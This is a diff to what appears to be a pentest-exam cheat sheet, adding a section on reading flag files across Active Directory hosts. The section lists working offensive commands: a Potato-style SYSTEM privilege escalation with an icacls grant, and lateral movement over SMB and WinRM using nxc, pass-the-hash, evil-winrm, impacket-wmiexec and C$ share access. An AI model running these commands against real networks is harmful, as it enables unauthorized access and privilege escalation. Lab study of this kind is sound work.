@@ -476,6 +476,27 @@ where /r C:\ proof.txt                                          # locate proof.t
 type C:\Users\Administrator\Desktop\proof.txt                   # common spot
 findstr /s /i "OS{ flag" C:\Users\*.txt 2>nul                   # find by content
 ```
+## 🏰 Active Directory — domain hosts & reading flags remotely
+> In an AD set **every host has its own `local.txt` + `proof.txt`** — grab them on the entry box, each pivot host, AND the DC. Three AD-specific gotchas:
+```
+# ⚠️ 1) the admin profile on a DC is usually RENAMED (not "Administrator"):
+dir C:\Users                                            # look for Administrator.<DOMAIN>, e.g. Administrator.DC01
+type C:\Users\Administrator.DC01\Desktop\proof.txt      # use the REAL name you see
+where /r C:\ proof.txt                                  # ...or just hunt it (then: type <full path>)
+
+# ⚠️ 2) "Access is denied" even though you're privileged? read it AS SYSTEM (SeImpersonate/Potato):
+#    have SYSTEM copy the flag somewhere you can read, and grant yourself access:
+.\ps.exe -c "cmd /c type C:\Users\Administrator.DC01\Desktop\proof.txt > C:\Users\<you>\Desktop\o.txt & icacls C:\Users\<you>\Desktop\o.txt /grant <you>:F"
+type C:\Users\<you>\Desktop\o.txt                       # (full detail: [POTATO-GOTCHAS])
+
+# ⚠️ 3) read a flag on ANOTHER domain host WITHOUT a full shell (you have admin creds/hash there):
+nxc smb <host> -u <u> -p <p> -x "type C:\Users\Administrator\Desktop\proof.txt"     # run a cmd remotely
+nxc smb <host> -u <u> -H <ntlm> -x "type C:\Users\*\Desktop\*.txt"                  # Pass-the-Hash variant
+evil-winrm -i <host> -u <u> -p <p>                       # ...or get a shell, then type it
+impacket-wmiexec <domain>/<u>:<p>@<host> "type C:\Users\Administrator\Desktop\proof.txt"
+smbclient //<host>/C$ -U '<u>%<p>' -c 'get Users\Administrator\Desktop\proof.txt'   # pull it via the C$ share
+```
+
 ## 🐧 Linux (on a target shell)
 ```
 id                                                             # who am I?
